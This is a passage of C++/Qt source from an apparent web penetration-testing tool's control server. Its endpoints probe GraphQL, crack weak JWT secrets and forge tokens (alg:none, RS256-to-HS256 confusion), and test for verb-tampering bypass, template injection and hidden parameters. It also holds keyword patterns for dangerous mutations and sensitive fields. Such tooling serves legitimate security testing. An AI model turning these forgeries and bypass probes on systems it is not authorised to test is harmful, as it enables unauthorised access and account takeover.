            const QString k = it.key(), v = it.value().toString();
            if (k.contains('\r') || k.contains('\n') || v.contains('\r') || v.contains('\n'))
                continue;
            req += k.toUtf8() + ": " + v.toUtf8() + "\r\n";
        }
        req += "Content-Length: " + QByteArray::number(q.size()) + "\r\n";
        req += "Connection: close\r\n\r\n";
        req += q;

        Nullock::Core::HttpClient client;
        const auto res = client.send(host, static_cast<quint16>(port), tls, req);
        if (!res.ok)
            return okJson({{ "ok", false }, { "error", "request failed: " + res.errorMessage }});
        // Cap the body we parse so a hostile endpoint can't OOM us.
        constexpr int kMaxSchema = 16 * 1024 * 1024;
        QJsonParseError jerr;
        const QJsonDocument doc = QJsonDocument::fromJson(res.parsed.body.left(kMaxSchema), &jerr);
        if (jerr.error != QJsonParseError::NoError || !doc.isObject())
            return okJson({{ "ok", true }, { "introspectionEnabled", false },
                           { "note", "response is not a JSON object (WAF/error page?) -- introspection state unknown" }});
        const QJsonObject root = doc.object();
        const QJsonObject schema = root.value("data").toObject().value("__schema").toObject();
        if (schema.isEmpty()) {
            const bool hadErrors = root.contains("errors");
            return okJson({{ "ok", true }, { "introspectionEnabled", false },
                           { "note", hadErrors
                               ? "introspection disabled (server returned a GraphQL error)"
                               : "no __schema in response -- introspection likely disabled" }});
        }

        // Empty mutationTypeName (no mutations) must NOT match a type whose
        // name happens to be empty -- guard explicitly.
        const QString mutationTypeName = schema.value("mutationType").toObject().value("name").toString();
        static const QRegularExpression dangerousRx(
            R"(^(delete|remove|destroy|drop|purge|wipe|grant|revoke|setRole|set_role|makeAdmin|promote|impersonate|assumeIdentity|resetPassword|reset_password|disable|ban|deactivate|transfer|refund|approve|override)\w*)",
            QRegularExpression::CaseInsensitiveOption);
        // A field is sensitive if its (lower-cased) name contains any of
        // these tokens -- catches userPassword / stripeApiKey / hashedToken,
        // not just names that start with the token.
        static const QStringList sensitiveTokens = {
            "password", "passwd", "secret", "token", "apikey", "accesstoken",
            "refreshtoken", "privatekey", "ssn", "socialsecurity", "creditcard",
            "cardnumber", "cvv", "mfasecret", "recoverycode",
        };
        // The token must sit on a name boundary -- at the start, after a
        // '_', or at a camelCase hump -- and end the same way, so 'password'
        // in userPassword / x_ssn / apiKeyList matches but 'token' inside
        // 'tokenize' (lowercase continuation) doesn't.
        auto isSensitive = [&](const QString &fn) {
            const QString l = fn.toLower();
            for (const QString &tok : sensitiveTokens) {
                int idx = l.indexOf(tok);
                while (idx >= 0) {
                    const int after = idx + tok.size();
                    const bool boundBefore = idx == 0 || l[idx - 1] == '_'
                        || fn[idx].isUpper();
                    const bool boundAfter = after >= l.size() || l[after] == '_'
                        || fn[after].isUpper() || fn[after].isDigit();
                    if (boundBefore && boundAfter) return true;
                    idx = l.indexOf(tok, idx + 1);
                }
            }
            return false;
        };

        QJsonArray dangerousMutations, sensitiveFields;
        int typeCount = 0, fieldCount = 0;
        constexpr int kMaxList = 200;   // bound the returned arrays
        for (const QJsonValue &tv : schema.value("types").toArray()) {
            const QJsonObject type = tv.toObject();
            const QString typeName = type.value("name").toString();
            if (typeName.isEmpty() || typeName.startsWith("__")) continue;
            ++typeCount;
            const bool isMutationType = !mutationTypeName.isEmpty() && typeName == mutationTypeName;
            for (const QJsonValue &fv : type.value("fields").toArray()) {
                const QString fn = fv.toObject().value("name").toString();
                if (fn.isEmpty()) continue;
                ++fieldCount;
                if (isMutationType && dangerousMutations.size() < kMaxList
                    && dangerousRx.match(fn).hasMatch())
                    dangerousMutations.append(fn);
                if (sensitiveFields.size() < kMaxList && isSensitive(fn))
                    sensitiveFields.append(QString("%1.%2").arg(typeName, fn));
            }
        }

        if (m_wiring.scanner) {
            m_wiring.scanner->reportFinding(0, "low", "graphql-introspection-active",
                "GraphQL introspection enabled -- full schema readable",
                QString("%1 types, %2 fields exposed").arg(typeCount).arg(fieldCount),
                host, url);
            if (!dangerousMutations.isEmpty()) {
                QStringList ms; for (const auto &v : dangerousMutations) ms << v.toString();
                m_wiring.scanner->reportFinding(0, "medium", "graphql-dangerous-mutation",
                    "GraphQL exposes state-changing mutations: " + ms.join(", "),
                    "review authorization on each", host, url);
            }
            if (!sensitiveFields.isEmpty()) {
                QStringList fs; for (const auto &v : sensitiveFields) fs << v.toString();
                m_wiring.scanner->reportFinding(0, "medium", "graphql-sensitive-field",
                    "GraphQL schema exposes sensitive field(s): " + fs.mid(0, 10).join(", "),
                    "ensure these are never returned to unauthorized callers", host, url);
            }
        }
        return okJson({{ "ok", true }, { "introspectionEnabled", true },
                       { "types", typeCount }, { "fields", fieldCount },
                       { "mutationType", mutationTypeName },
                       { "dangerousMutations", dangerousMutations },
                       { "sensitiveFields", sensitiveFields }});
    }

    if (path == "/api/graphql/probe") {
        if (!m_wiring.scanner)
            return okJson({{ "ok", false }, { "error", "no scanner" }});
        const QString url = bodyJson.value("url").toString();
        if (url.isEmpty())
            return okJson({{ "ok", false }, { "error", "url required" }});
        const QUrl u(url);
        if (!u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "invalid url" }});
        const QJsonObject extraHeaders = bodyJson.value("headers").toObject();

        // Build probe queries up front; pure data so we can fan them out.
        struct Probe {
            QByteArray name;
            QByteArray queryJson;
            QByteArray expectMarker;     // substring -> "fired" finding
            QByteArray missMarker;       // substring -> "negative" (no finding)
            const char *severity;
            const char *kind;
            const char *summary;
            const char *fixHint;
        };
        const QList<Probe> probes = {
            {
                "introspection",
                R"({"query":"{__schema{types{name}}}"})",
                "\"__schema\"", "",
                "medium", "graphql-introspection-active",
                "GraphQL introspection enabled in production",
                "disable introspection or restrict to dev environments",
            },
            {
                "field-suggestion",
                R"({"query":"{ usrr { id } }"})",
                "Did you mean",   "",
                "low", "graphql-field-suggestion",
                "GraphQL leaks schema via field suggestions",
                "set NoSchemaIntrospectionCustomRule or disable suggestions",
            },
            {
                "alias-amplification",
                // 100 aliased __typename calls -- cheap to assemble,
                // expensive for the server if there's no alias cap.
                {},  // built below
                "\"data\"", "",
                "high", "graphql-alias-amplification",
                "GraphQL accepts 100+ aliased fields in one query",
                "set max-alias-count or enforce query-cost limits",
            },
            {
                "depth-bypass",
                R"({"query":"{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}"})",
                "\"data\"", "Cannot query field",
                "medium", "graphql-depth-bypass",
                "GraphQL allows 10-level deep nested query (no depth limit)",
                "set max query depth (graphql-depth-limit etc.)",
            },
            {
                "batch-bypass",
                R"([{"query":"{__typename}"},{"query":"{__typename}"}])",
                "[", "",
                "low", "graphql-batched-queries",
                "GraphQL accepts batched-array queries (rate-limit bypass)",
                "disable batched mode or rate-limit per-operation",
            },
        };
        // Build the alias-amplification body.
        QByteArray aliasQuery = "{\"query\":\"{";
        for (int i = 0; i < 100; ++i) {
            aliasQuery += "a" + QByteArray::number(i) + ":__typename ";
        }
        aliasQuery += "}\"}";
        QList<Probe> work = probes;
        for (auto &p : work) {
            if (p.queryJson.isEmpty()) p.queryJson = aliasQuery;
        }

        Wiring w = m_wiring;
        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool useTls = (u.scheme() == "https");
        const QString reqPath = u.path().isEmpty() ? "/graphql" : u.path();

        (void)QtConcurrent::run([w, host, port, useTls, reqPath, work, extraHeaders]() {
            for (const auto &p : work) {
                // Hand-craft an HTTP/1.1 POST. We use HttpClient::send for
                // wire-level TLS/keepalive; raw assembly is fine here
                // because we control every byte.
                QByteArray bytes;
                bytes  = "POST " + reqPath.toUtf8() + " HTTP/1.1\r\n";
                bytes += "Host: " + host.toUtf8() + "\r\n";
                bytes += "Content-Type: application/json\r\n";
                bytes += "User-Agent: Nullock/graphql-probe\r\n";
                bytes += "Accept: application/json\r\n";
                for (auto it = extraHeaders.begin(); it != extraHeaders.end(); ++it) {
                    bytes += it.key().toUtf8() + ": "
                          + it.value().toString().toUtf8() + "\r\n";
                }
                bytes += "Content-Length: "
                       + QByteArray::number(p.queryJson.size()) + "\r\n";
                bytes += "Connection: close\r\n\r\n";
                bytes += p.queryJson;

                Nullock::Core::HttpClient client;
                const auto r = client.send(host, static_cast<quint16>(port),
                                           useTls, bytes);
                if (!r.ok) continue;
                const QByteArray respBody = r.parsed.body;

                // Negative-marker check first (e.g. "Cannot query field"
                // means depth probe was rejected -> no finding).
                if (!p.missMarker.isEmpty()
                    && respBody.contains(p.missMarker))
                    continue;
                // Positive-marker check: response must contain the
                // expected indicator (e.g. "__schema" reflected back).
                if (!respBody.contains(p.expectMarker))
                    continue;
                // Don't flag transport errors as findings.
                if (r.parsed.statusCode >= 500) continue;

                const QString fullUrl =
                    QString("%1://%2%3").arg(useTls ? "https" : "http", host, reqPath);
                if (w.scanner) {
                    QMetaObject::invokeMethod(w.scanner, [w, p, host, fullUrl]() {
                        w.scanner->reportFinding(
                            0, QString::fromLatin1(p.severity),
                            QString::fromLatin1(p.kind),
                            QString::fromLatin1(p.summary),
                            QString::fromLatin1(p.fixHint),
                            host, fullUrl);
                    }, Qt::QueuedConnection);
                }
            }
        });
        return okJson({{ "queued", static_cast<int>(work.size()) },
                       { "target", url }});
    }

    // ---- JWT attack toolkit ------------------------------------------
    // POST /api/jwt/analyze { token, wordlist?: ["secret", ...] }
    //   Decodes the token, lists weaknesses, and (if a wordlist is given)
    //   tries to recover a weak HS* secret. All offline.
    if (path == "/api/jwt/analyze") {
        const QString token = bodyJson.value("token").toString();
        if (token.isEmpty())
            return okJson({{ "ok", false }, { "error", "token required" }});
        const auto d = Nullock::Core::JwtTool::decode(token);
        if (!d.ok)
            return okJson({{ "ok", false }, { "error", d.error }});

        QJsonArray weaknesses;
        for (const auto &w : Nullock::Core::JwtTool::analyze(d)) {
            weaknesses.append(QJsonObject{
                { "id", w.id }, { "severity", w.severity }, { "detail", w.detail } });
        }

        QString recovered;
        if (bodyJson.contains("wordlist")) {
            QStringList cands;
            for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
                cands.append(v.toString());
            recovered = Nullock::Core::JwtTool::bruteHmac(d, cands);
        }

        QJsonObject out{
            { "ok", true },
            { "alg", d.alg },
            { "typ", d.typ },
            { "kid", d.kid },
            { "header", QJsonDocument::fromJson(d.headerJson.toUtf8()).object() },
            { "payload", QJsonDocument::fromJson(d.payloadJson.toUtf8()).object() },
            { "weaknesses", weaknesses },
        };
        if (bodyJson.contains("wordlist")) {
            out["secretRecovered"] = !recovered.isEmpty();
            out["secret"] = recovered;   // empty if not found
        }
        return httpJson(200, out);
    }

    // POST /api/jwt/forge
    //   { token, attack: "none" | "hs256", secret?, claims?: { k: v } }
    //   none  -> strip the signature (alg:none bypass), apply claim overrides
    //   hs256 -> re-sign with `secret` (also the RS256->HS256 confusion
    //            primitive: pass the server's PEM public key as secret),
    //            applying claim overrides first
    if (path == "/api/jwt/forge") {
        const QString token = bodyJson.value("token").toString();
        const QString attack = bodyJson.value("attack").toString("none").toLower();
        if (token.isEmpty())
            return okJson({{ "ok", false }, { "error", "token required" }});
        const auto d = Nullock::Core::JwtTool::decode(token);
        if (!d.ok)
            return okJson({{ "ok", false }, { "error", d.error }});

        const QJsonObject claims = bodyJson.value("claims").toObject();
        QString forged;
        if (attack == "none") {
            forged = Nullock::Core::JwtTool::forgeNone(d, claims);
        } else if (attack == "hs256" || attack == "hmac") {
            const QByteArray secret = bodyJson.value("secret").toString().toUtf8();
            if (secret.isEmpty())
                return okJson({{ "ok", false },
                               { "error", "hs256 forge needs a secret" }});
            // Apply claim overrides onto a copy of the payload, force HS256.
            QJsonObject header = d.header;  header["alg"] = "HS256";
            QJsonObject payload = d.payload;
            for (auto it = claims.begin(); it != claims.end(); ++it)
                payload[it.key()] = it.value();
            forged = Nullock::Core::JwtTool::signHmac(header, payload, secret);
        } else {
            return okJson({{ "ok", false },
                           { "error", "attack must be 'none' or 'hs256'" }});
        }
        return httpJson(200, QJsonObject{
            { "ok", true }, { "attack", attack }, { "token", forged } });
    }

    // ---- Active JWT attack (send forgeries, check acceptance) ---------
    // POST /api/jwt/test { url, token, location?, method?, headers?, wordlist?: [...] }
    //   Sends the valid token (baseline), a corrupted one (calibration), then
    //   alg:none / tampered-claim / weak-secret forgeries; flags a forgery the
    //   server accepts as the valid baseline. CWE-347.
    if (path == "/api/jwt/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        const QString token = bodyJson.value("token").toString();
        if (token.isEmpty())
            return okJson({{ "ok", false }, { "error", "token (a captured JWT) required" }});

        Nullock::Core::JwtProbe::Request jr;
        jr.host = u.host();
        jr.port = u.port(u.scheme() == "https" ? 443 : 80);
        jr.tls  = (u.scheme() == "https");
        jr.method = httpMethodFromJson(bodyJson, "GET");
        jr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        jr.query = u.query(QUrl::FullyEncoded);
        jr.token = token;
        jr.location = bodyJson.value("location").toString();
        jr.publicKeyPem = bodyJson.value("publicKey").toString();
        jr.body = bodyJson.value("body").toString().toUtf8();
        jr.contentType = contentTypeFromJson(bodyJson);
        for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
            jr.secretWordlist << v.toString();
        const QJsonObject jhdrs = bodyJson.value("headers").toObject();
        for (auto it = jhdrs.begin(); it != jhdrs.end(); ++it)
            jr.headers.append({ it.key(), it.value().toString() });

        const auto jres = Nullock::Core::JwtProbe::test(jr);
        QJsonArray hits;
        for (const auto &h : jres.hits)
            hits.append(QJsonObject{{ "attack", h.attack }, { "kind", h.kind },
                                    { "detail", h.detail }, { "carrier", h.carrier }});
        if (m_wiring.scanner && jres.vulnerable)
            for (const auto &h : jres.hits)
                m_wiring.scanner->reportFinding(0, "critical", h.kind,
                    "JWT auth bypass via " + h.attack
                        + (h.carrier.isEmpty() ? "" : " (" + h.carrier + ")"),
                    h.detail, u.host(), url);
        return okJson({{ "ok", jres.error.isEmpty() },
                       { "error", jres.error },
                       { "vulnerable", jres.vulnerable },
                       { "calibrated", jres.calibrated },
                       { "authStatus", jres.authStatus },
                       { "rejectStatus", jres.rejectStatus },
                       { "requestsSent", jres.requestsSent },
                       { "hitCount", static_cast<int>(jres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Deep-scan orchestrator --------------------------------------
    // POST /api/audit/run { url, method?, body?, headers?, include?: [...] }
    //   Points the whole active-testing battery at one endpoint in a single
    //   call -- parameter mining, verb-tampering, CORS, IDOR, and (when a
    //   body is given) mass-assignment -- and returns a consolidated report.
    //   Each tester emits its findings into the panel as usual. The "one
    //   command, every test" workflow Burp's per-insertion-point active
    //   scan doesn't give you.
    if (path == "/api/audit/run") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool tls = (u.scheme() == "https");
        QString basePath = u.path(QUrl::FullyEncoded).isEmpty()
                           ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const QString rawQuery = u.query(QUrl::FullyEncoded);
        if (!rawQuery.isEmpty()) basePath += "?" + rawQuery;
        const QString method = httpMethodFromJson(bodyJson, "GET");
        const QByteArray body = bodyJson.value("body").toString().toUtf8();
        QList<QPair<QString, QString>> headers;
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            headers.append({ it.key(), it.value().toString() });

        // Which testers to run (default: all applicable).
        QSet<QString> include;
        for (const QJsonValue &v : bodyJson.value("include").toArray())
            include.insert(v.toString().toLower());

        AuditTarget t;
        t.host = host; t.port = port; t.tls = tls;
        t.method = method; t.basePath = basePath; t.body = body;
        t.headers = headers; t.url = url;
        for (const auto &h : headers)
            if (h.first.compare("Content-Type", Qt::CaseInsensitive) == 0)
                { t.contentType = h.second; break; }

        // NOTE: this runs the whole battery synchronously and blocks the
        // control server for its duration, like the other active-test
        // endpoints. For a session-wide sweep use /api/audit/all, which
        // runs off-thread.
        QJsonArray testerReports;
        const int totalFindings = runDeepAudit(m_wiring.scanner, t, include, testerReports);

        return okJson({{ "target", url },
                       { "totalFindings", totalFindings },
                       { "testers", testerReports }});
    }

    // ---- Session-wide deep audit -------------------------------------
    // POST /api/audit/all { urls?: [...], fromHistory?, limit?, throttleMs?,
    //                       include? }
    //   Runs the deep-scan battery against every URL given (and/or every
    //   captured history row that carries a query string or body), OFF the
    //   control thread so the UI stays responsive. Findings land in the
    //   panel as they're confirmed; returns the queued count immediately.
    //   The "browse the app, then audit everything you touched" workflow.
    if (path == "/api/audit/all") {
        // One sweep at a time -- a second concurrent sweep would double the
        // outbound active-test traffic against the target for no benefit.
        static QAtomicInteger<int> auditAllInFlight(0);
        if (!auditAllInFlight.testAndSetAcquire(0, 1))
            return okJson({{ "ok", false }, { "queued", 0 },
                           { "error", "a deep-audit sweep is already running" }});

        QSet<QString> include;
        for (const QJsonValue &v : bodyJson.value("include").toArray())
            include.insert(v.toString().toLower());
        int throttleMs = bodyJson.value("throttleMs").toInt(150);
        int limit = bodyJson.value("limit").toInt(50);
        throttleMs = qBound(0, throttleMs, 60'000);
        limit = qBound(1, limit, 200);

        QList<AuditTarget> targets;
        int scopeSkipped = 0;
        auto fromUrl = [&](const QString &urlStr) {
            const QUrl uu(urlStr);
            if (!uu.isValid() || uu.host().isEmpty()) return;
            // ScopeGuard: never run the active battery against an out-of-scope host.
            if (blocksScope(uu.host())) { ++scopeSkipped; return; }
            AuditTarget t;
            t.host = uu.host();
            t.port = uu.port(uu.scheme() == "https" ? 443 : 80);
            t.tls  = (uu.scheme() == "https");
            t.method = "GET";
            t.basePath = uu.path(QUrl::FullyEncoded).isEmpty()
                         ? QStringLiteral("/") : uu.path(QUrl::FullyEncoded);
            if (!uu.query(QUrl::FullyEncoded).isEmpty())
                t.basePath += "?" + uu.query(QUrl::FullyEncoded);
            t.url = urlStr;
            targets.append(t);
        };
        for (const QJsonValue &v : bodyJson.value("urls").toArray())
            if (targets.size() < limit) fromUrl(v.toString());

        // Pull in history rows that have a query string or a body.
        if (bodyJson.value("fromHistory").toBool(false) && m_wiring.history) {
            const int rc = m_wiring.history->rowCount();
            for (int i = rc - 1; i >= 0 && targets.size() < limit; --i) {
                const auto *r = m_wiring.history->requestAt(i);
                if (!r || r->method.startsWith("WS")) continue;
                const bool hasQuery = r->path.contains('?');
                const bool hasBody  = !r->body.isEmpty();
                if (!hasQuery && !hasBody) continue;
                if (blocksScope(r->host)) { ++scopeSkipped; continue; }   // ScopeGuard
                AuditTarget t;
                t.host = r->host; t.port = r->port;
                // Use the captured response's real TLS flag, not a port guess.
                const auto *resp = m_wiring.history->responseAt(i);
                t.tls = resp ? resp->wasTls : (r->port == 443);
                t.method = r->method.isEmpty() ? QStringLiteral("GET") : r->method;
                t.basePath = r->path; t.body = r->body;
                for (const auto &h : r->headers)
                    if (h.first.compare("Content-Type", Qt::CaseInsensitive) == 0)
                        { t.contentType = h.second; break; }
                t.url = (t.tls ? "https://" : "http://") + r->host + r->path;
                targets.append(t);
            }
        }
        if (targets.isEmpty()) {
            auditAllInFlight.storeRelease(0);
            return okJson({{ "ok", false }, { "queued", 0 },
                           { "error", "no urls or history rows with params/body" }});
        }

        // QPointer guards against the scanner being torn down mid-sweep: we
        // check it before each target and bail if it's gone.
        QPointer<Nullock::Core::PassiveScanner> scGuard(m_wiring.scanner);
        (void)QtConcurrent::run([scGuard, targets, include, throttleMs]() {
            for (const AuditTarget &t : targets) {
                if (scGuard.isNull()) break;          // app/scanner torn down
                QJsonArray ignore;
                runDeepAudit(scGuard.data(), t, include, ignore);
                if (throttleMs > 0) QThread::msleep(static_cast<unsigned long>(throttleMs));
            }
            auditAllInFlight.storeRelease(0);          // sweep done; allow the next
        });
        return okJson({{ "queued", static_cast<int>(targets.size()) },
                       { "scopeSkipped", scopeSkipped }});
    }

    // ---- Parameter mining --------------------------------------------
    // POST /api/paramminer { url, method?, wordlist?: [...], headers?: {} }
    //   Discovers hidden parameters by response-diffing: fires batches of
    //   candidate names and reports the ones the server reflects or that
    //   flip the HTTP status. Burp ships this only as the param-miner
    //   extension; we do it in the core. Discovered params also become
    //   findings so they ride into the report / SARIF export.
    if (path == "/api/paramminer") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::ParamMiner::Request mreq;
        mreq.host   = u.host();
        mreq.port   = u.port(u.scheme() == "https" ? 443 : 80);
        mreq.tls    = (u.scheme() == "https");
        mreq.method = httpMethodFromJson(bodyJson, "GET");
        mreq.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                        ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            mreq.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            mreq.headers.append({ it.key(), it.value().toString() });

        QStringList wordlist;
        for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
            wordlist << v.toString();
        if (wordlist.isEmpty())
            wordlist = Nullock::Core::ParamMiner::defaultWordlist();
        if (wordlist.size() > 2000) wordlist = wordlist.mid(0, 2000);
        const int batch = bodyJson.value("batchSize").toInt(25);

        Nullock::Core::ParamMiner::Result mr;
        {
            auto fut = QtConcurrent::run([mreq, wordlist, batch]() {
                return Nullock::Core::ParamMiner::mine(mreq, wordlist, batch);
            });
            fut.waitForFinished();
            mr = fut.result();
        }

        // Emit findings for discovered params so they show up in the
        // findings panel / report alongside everything else.
        if (m_wiring.scanner) {
            const QString host = u.host();
            for (const auto &f : mr.found) {
                const QString sev  = f.reflected ? QStringLiteral("medium")
                                                 : QStringLiteral("low");
                const QString kind = f.reflected ? QStringLiteral("hidden-param-reflected")
                                                 : QStringLiteral("hidden-param");
                const QString summary = f.reflected
                    ? QString("Hidden parameter '%1' is reflected in the response").arg(f.name)
                    : QString("Hidden parameter '%1' changes the response (status %2 -> %3)")
                          .arg(f.name).arg(f.baselineStatus).arg(f.observedStatus);
                m_wiring.scanner->reportFinding(0, sev, kind, summary,
                    "discovered by param-miner via " + f.signal, host, url);
            }
        }

        QJsonArray found;
        for (const auto &f : mr.found)
            found.append(QJsonObject{
                { "name", f.name }, { "signal", f.signal },
                { "reflected", f.reflected },
                { "baselineStatus", f.baselineStatus },
                { "observedStatus", f.observedStatus } });
        return okJson({{ "ok", mr.error.isEmpty() },
                       { "error", mr.error },
                       { "requestsSent", mr.requestsSent },
                       { "candidatesTried", mr.candidatesTried },
                       { "statusSignalUsable", mr.statusSignalUsable },
                       { "reflectionSignalUsable", mr.reflectionSignalUsable },
                       { "foundCount", static_cast<int>(mr.found.size()) },
                       { "found", found }});
    }

    // ---- Verb-tampering / method auth-bypass -------------------------
    // POST /api/verbtamper/test { url, method?, body?, headers? }
    //   Takes a denied request and retries it with alternate methods,
    //   method-override headers, and case variation; flags any that flip
    //   to 2xx (a confirmed access-control bypass). CWE-650.
    if (path == "/api/verbtamper/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::VerbTamper::Request vr;
        vr.host = u.host();
        vr.port = u.port(u.scheme() == "https" ? 443 : 80);
        vr.tls  = (u.scheme() == "https");
        vr.method = httpMethodFromJson(bodyJson, "GET");
        vr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            vr.basePath += "?" + u.query(QUrl::FullyEncoded);
        vr.body = bodyJson.value("body").toString().toUtf8();
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            vr.headers.append({ it.key(), it.value().toString() });

        const auto vres = Nullock::Core::VerbTamper::test(vr);

        QJsonArray bypasses;
        QStringList techniques;
        for (const auto &b : vres.bypasses) {
            bypasses.append(QJsonObject{
                { "technique", b.technique }, { "detail", b.detail },
                { "status", b.status } });
            techniques << b.technique;
        }
        if (m_wiring.scanner && !vres.bypasses.isEmpty()) {
            m_wiring.scanner->reportFinding(0, "high", "auth-bypass-verb-tampering",
                QString("Verb tampering: %1 (denied %2) is reachable via %3")
                    .arg(vr.basePath).arg(vres.baselineStatus).arg(techniques.join(", ")),
                "denied baseline flipped to 2xx under the listed techniques",
                u.host(), url);
        }
        return okJson({{ "ok", vres.error.isEmpty() },
                       { "error", vres.error },
                       { "baselineStatus", vres.baselineStatus },
                       { "baselineDenied", vres.baselineDenied },
                       { "requestsSent", vres.requestsSent },
                       { "bypassCount", static_cast<int>(vres.bypasses.size()) },
                       { "bypasses", bypasses }});
    }

    // ---- Server-Side Template Injection ------------------------------
    // POST /api/ssti/test { url, param, in?, method?, body?, contentType?,
    //                       headers? }
    //   Injects an arithmetic-bearing polyglot per template-engine delimiter
    //   family into `param` and confirms SSTI when the server returns the
    //   evaluated product (not the literal expression). The family that fires
    //   fingerprints the engine. CWE-1336 -- frequently RCE.
    if (path == "/api/ssti/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        const QString param = bodyJson.value("param").toString();
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        if (param.isEmpty())
            return okJson({{ "ok", false }, { "error", "param required" }});

        Nullock::Core::Ssti::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.method = httpMethodFromJson(bodyJson, "GET");
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        sr.query = u.query(QUrl::FullyEncoded);
        sr.body = bodyJson.value("body").toString().toUtf8();
        sr.contentType = contentTypeFromJson(bodyJson);
        sr.paramName = param;
        sr.paramIn = bodyJson.value("in").toString("query");
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::Ssti::test(sr);

        QJsonArray hits;
        QStringList fams;
        for (const auto &h : sres.hits) {
            hits.append(QJsonObject{
                { "polyglot", h.polyglot }, { "engines", h.engines },
                { "evidence", h.evidence } });
            fams << h.polyglot;
        }
        if (m_wiring.scanner && sres.confirmed) {
            m_wiring.scanner->reportFinding(0, "critical", "ssti-confirmed",
                QString("Server-side template injection in '%1' -- %2 (%3)")
                    .arg(param, sres.engines, fams.join(", ")),
                "the server evaluated an injected arithmetic expression; "
                "template injection is frequently a path to RCE",
                u.host(), url);
        } else if (m_wiring.scanner && sres.engineLikely) {
            m_wiring.scanner->reportFinding(0, "medium", "ssti-engine-likely",
                QString("Template engine likely behind '%1' -- a syntax break "
                        "5xx'd an otherwise-OK endpoint").arg(param),
                "no value reflected, but malformed template syntax errored the "
                "response; worth manual confirmation",
                u.host(), url);
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "injected", sres.injected },
                       { "confirmed", sres.confirmed },
                       { "engineLikely", sres.engineLikely },
                       { "engines", sres.engines },
                       { "baselineStatus", sres.baselineStatus },
                       { "requestsSent", sres.requestsSent },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- One-call host assessment ------------------------------------
    // POST /api/assess { url }
    //   Runs the safe identification battery against a host -- tech
    //   fingerprint (+CVE), security-header/CSP audit, HTTP method audit, and
    //   (for https) TLS inspection -- and aggregates the findings. Read-only
    //   recon/assessment; the active injection battery stays opt-in via /audit.
    if (path == "/api/assess") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool tls = (u.scheme() == "https");
        const QString basePath = u.path(QUrl::FullyEncoded).isEmpty()
                                 ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const QString query = u.query(QUrl::FullyEncoded);

        QJsonObject out = assessWebTarget(m_wiring.scanner, host, port, tls,
                                          basePath, query, url);
        out["ok"] = true;
        return okJson(out);
    }

    // ---- Web cache deception -----------------------------------------
    // POST /api/cachedeception/test { url }
    //   Detects path-confusion where a dynamic/sensitive page is served at a
    //   static-extension URL a cache would store. CWE-525. Read-only.
    if (path == "/api/cachedeception/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CacheDeception::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        cr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::CacheDeception::test(cr);
        QJsonArray hits; bool anyCacheable = false;
        for (const auto &h : cres.hits) {
            if (h.cacheable) anyCacheable = true;
